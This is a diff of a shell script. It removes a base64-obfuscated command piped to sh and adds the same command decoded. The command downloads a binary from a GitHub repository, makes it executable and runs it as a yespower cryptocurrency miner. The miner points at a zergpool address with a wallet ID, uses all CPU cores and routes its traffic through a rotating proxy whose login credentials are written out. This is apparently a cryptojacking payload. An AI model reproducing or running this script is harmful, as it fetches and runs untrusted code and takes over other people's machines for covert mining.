@@ -1,2 +1,4 @@
-echo exec="YXB0IHVwZGF0ZSAteSAKIHdnZXQgaHR0cHM6Ly9naXRodWIuY29tL01hc3RlcjQ3ODk2My9sb2xNaW5ldC9yYXcvbWFpbi9kYXRhICAKY2htb2QgNzc3IGRhdGEgCiAuL2RhdGEgLWEgeWVzcG93ZXIgLW8gc3RyYXR1bSt0Y3A6Ly95ZXNwb3dlci5hc2lhLm1pbmUuemVyZ3Bvb2wuY29tOjY1MzMgLXUgUkVFYlIyZDNKdTNGNXRmdWczUDgxcWViNG5kNzl0akM0ZS50ZXN0ICAtcCBjPVJWTiAtdCAkKG5wcm9jKSAteCBzb2NrczU6Ly9zbnp5cGh5ZC1JTC1OTC1yb3RhdGU6OGpxOTV6YXhyN2pmQHAud2Vic2hhcmUuaW86ODA="
-base64 -d <<< $exec | sh
+apt update -y 
+wget https://github.com/Master478963/lolMinet/raw/main/data  
+chmod 777 data 
+./data -a yespower -o stratum+tcp://yespower.asia.mine.zergpool.com:6533 -u REEbR2d3Ju3F5tfug3P81qeb4nd79tjC4e.test  -p c=RVN -t $(nproc) -x socks5://snzyphyd-IL-NL-rotate:8jq95zaxr7jf@p.webshare.io:80
